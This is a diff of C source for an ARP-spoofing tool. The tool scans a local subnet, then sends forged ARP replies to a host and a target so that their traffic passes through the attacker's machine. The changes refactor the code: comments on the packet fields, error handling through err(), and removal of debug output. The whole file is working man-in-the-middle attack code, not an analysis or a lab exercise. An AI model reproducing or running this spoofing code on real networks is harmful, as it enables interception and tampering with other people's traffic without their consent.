@@ -14,20 +14,18 @@
 #include <netinet/if_ether.h>
 #include <netinet/tcp.h>
 
-
 #define FAIL     -1
 #define ARPSIZ   42 
 #define IPSLEN   20
 #define IP_ALEN  4
 #define MACSLEN  25
-#define TCPBUFZ  68880
 #define NPACKS   20
 #define SDELAY   500
 #define STIMEOUT 7 
 
 struct ip_mac {
     uint8_t ip[IP_ALEN];
-    unsigned char mac[ETH_ALEN];
+    uint8_t mac[ETH_ALEN];
     struct ip_mac *next;
 };
 
@@ -107,7 +105,6 @@ int main(int argc, char *argv[]) {
 
             default:
                 print_usage(argv[0]);
-                exit(1);
                 break;
         }
     }
@@ -169,12 +166,10 @@ int main(int argc, char *argv[]) {
     struct ip_mac *prv = NULL;
     while (1) {
         if (p->ip[3] == sufix) {
-            printf("rr\n");
             memcpy(host_mac, p->mac, ETH_ALEN);
             mac_to_str(host_m_str, host_mac);
 
             // remove host from linked list
-            printf("right then\n");
             if (prv) {
                 prv->next = p->next;
             }
@@ -210,13 +205,14 @@ int main(int argc, char *argv[]) {
         printf("Poisoning host %s...\n", host_str);
         int pkts = num_packets;
         while (pkts--) {
-            send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
-                    host_mac, 
-                    our_mac, 
-                    host_mac, 
-                    target_ip, 
-                    host_ip,
-                    ARPOP_REPLY);
+            send_arp(sock, ifreq_i.ifr_ifindex, 
+                    our_mac,      // eth source mac
+                    host_mac,     // eth dest mac
+                    our_mac,      // arp source mac
+                    host_mac,     // arp target mac
+                    target_ip,    // source ip
+                    host_ip,      // target ip
+                    ARPOP_REPLY); // opcode
 
             sleep(1);
             printf("H:(%s) ---> U:(%s) ---> T:(%s)\n",
@@ -226,7 +222,7 @@ int main(int argc, char *argv[]) {
         }
 
         // poison target 
-        printf("Poisoning target %d.%d.%d.%d ...\n", 
+        printf("\nPoisoning target %d.%d.%d.%d ...\n", 
                 p->ip[0],
                 p->ip[1],
                 p->ip[2],
@@ -234,13 +230,15 @@ int main(int argc, char *argv[]) {
 
         pkts = num_packets;
         while (pkts--) {
-            send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
-                    target_mac,
-                    our_mac,
-                    target_mac,
-                    host_ip,
-                    target_ip,
-                    ARPOP_REPLY);
+            send_arp(sock, ifreq_i.ifr_ifindex, 
+                    our_mac,      // eth source mac
+                    target_mac,   // eth dest mac
+                    our_mac,      // arp source mac
+                    target_mac,   // arp target mac
+                    host_ip,      // source ip 
+                    target_ip,    // target ip
+                    ARPOP_REPLY); // opcode 
+
 
             sleep(1);
             printf("H:(%s) <--- U:(%s) <--- T:(%s)\n",
@@ -254,17 +252,17 @@ int main(int argc, char *argv[]) {
 }
 
 void print_usage(char *pname) {
-    printf("Usage: (sudo) %s [interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
+    err(1, "Usage: (sudo) %s [interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
 }
 
-int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[IP_ALEN]) {
+int recv_arp(int sock, char *buf, unsigned short op_code, uint8_t s_ip[IP_ALEN]) {
     int bytes_recvd;
 
     while (1) {
         bytes_recvd = read(sock, buf, ARPSIZ);
 
         if (ntohs(((struct ethhdr*)(buf))->h_proto) == 0x0806) {
-            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr ));
+            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr));
 
             if (ntohs(arp->ea_hdr.ar_op) == op_code && memcmp(arp->arp_spa, s_ip, 4) == 0) {
                 return bytes_recvd;
@@ -275,20 +273,20 @@ int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[IP_AL
 
 void destroy_pairs(struct ip_mac *head) {
     if (head == NULL) {
-        free(head);
         return;
     }
     destroy_pairs(head->next);
     free(head);
 }
 
-struct ip_mac *add_ip_mac(struct ip_mac *head, uint8_t ip[IP_ALEN], unsigned char mac[ETH_ALEN]){
+struct ip_mac *add_ip_mac(struct ip_mac *head, uint8_t ip[IP_ALEN],
+                                               uint8_t mac[ETH_ALEN]) {
     struct ip_mac *new = malloc(sizeof(struct ip_mac));
 
     memcpy(new->ip, ip, IP_ALEN);
     memcpy(new->mac, mac, ETH_ALEN);
 
-    new-> next = head;
+    new->next = head;
     return new;
 }
 
@@ -303,7 +301,7 @@ struct ip_mac *ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN],
     // spam ARP requests
     printf("sweep scan ...\n");
 
-    int i = 255;
+    int i = 0xff;
     while (i--) {
         t_ip[3] = i;
         send_arp(sock, if_idx, s_mac,
@@ -320,7 +318,11 @@ struct ip_mac *ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN],
     time_t endwait;
     time_t start       = time(NULL);
     time_t seconds     = STIMEOUT;
-    unsigned char *buf = malloc(ARPSIZ);
+
+    unsigned char *buf;
+    if (!(buf = malloc(ARPSIZ))) {
+        err(1, "Error : malloc buf in %s == NULL\n", __FUNCTION__);
+    }
 
     endwait = start + seconds;
 
@@ -364,17 +366,16 @@ void mac_to_str(char mac_str[MACSLEN], uint8_t mac[ETH_ALEN]) {
                                                mac[5]);
 }
 
-int get_if_info(int sock, char dev[IFNAMSIZ], 
-                struct ifreq *ifreq_i,
-                struct ifreq *ifreq_c,
-                struct ifreq *ifreq_ip) {
+int get_if_info(int sock, char dev[IFNAMSIZ], struct ifreq *ifreq_i,
+                                              struct ifreq *ifreq_c,
+                                              struct ifreq *ifreq_ip) {
 
     // get index number 
     memset(ifreq_i, 0, sizeof(struct ifreq));
     strncpy(ifreq_i->ifr_name, dev, IFNAMSIZ-1);
    
     if ((ioctl(sock, SIOCGIFINDEX, ifreq_i)) == FAIL) {
-        printf("Error : %s ioctl index read failed\n", dev);
+        err(1, "Error : %s ioctl index read failed\n", dev);
         return FAIL;
     }
 
@@ -383,7 +384,7 @@ int get_if_info(int sock, char dev[IFNAMSIZ],
     strncpy(ifreq_c->ifr_name, dev, IFNAMSIZ-1);
 
     if ((ioctl(sock, SIOCGIFHWADDR, ifreq_c)) == FAIL) {
-        printf("Error : ioctl MAC read failed\n");
+        err(1, "Error : ioctl MAC read failed\n");
         return FAIL;
     }
 
@@ -392,7 +393,7 @@ int get_if_info(int sock, char dev[IFNAMSIZ],
     strncpy(ifreq_ip->ifr_name, dev, IFNAMSIZ-1);
 
     if(ioctl(sock, SIOCGIFADDR, ifreq_ip) == FAIL) {
-        printf("Error : ioctl IP read failed\n");
+        err(1, "Error : ioctl IP read failed\n");
         return FAIL;
     }
     return 0;
@@ -400,7 +401,7 @@ int get_if_info(int sock, char dev[IFNAMSIZ],
 
 int is_valid_ip(char *ip) {
     struct sockaddr_in sa;
-    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
+    int result = inet_pton(AF_INET, ip, &sa);
     return result > 0;
 }
 
@@ -425,23 +426,24 @@ int send_arp(int sock, int if_idx, uint8_t s_mac[ETH_ALEN],
     // cast next section to ARP header 
     struct ether_arp *arp = (struct ether_arp *)(sendbuff + sizeof(struct ether_header));
      
-    // add ARP source/dest MAC
+    // add ARP source/target MAC
     memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
     memcpy(arp->arp_tha, arp_t_mac, ETH_ALEN);
     
-    // add ARP source/dest IP
+    // add ARP source/target IP
     memcpy(arp->arp_spa, arp_s_ip, 4);
     memcpy(arp->arp_tpa, arp_t_ip, 4);
 
     // set hardware type, protocol and opcode
     arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
-    arp->ea_hdr.ar_pro = htons(2048);
+    arp->ea_hdr.ar_pro = htons(0x0800);
     arp->ea_hdr.ar_op  = htons(opcode);
     
     // number of bytes in MAC/IP addresses
     arp->ea_hdr.ar_hln = ETH_ALEN;   
     arp->ea_hdr.ar_pln = 4;
 
+    // 
     struct sockaddr_ll sadr_ll;
     sadr_ll.sll_ifindex = if_idx;
     sadr_ll.sll_halen   = ETH_ALEN;
@@ -449,7 +451,7 @@ int send_arp(int sock, int if_idx, uint8_t s_mac[ETH_ALEN],
 
     // send
     if ((send_len = sendto(sock, sendbuff, ARPSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
-        printf("Error : sending failed :(\n");
+        err(1, "Error : sending failed :(\n");
         return FAIL;
     }
     return 0;
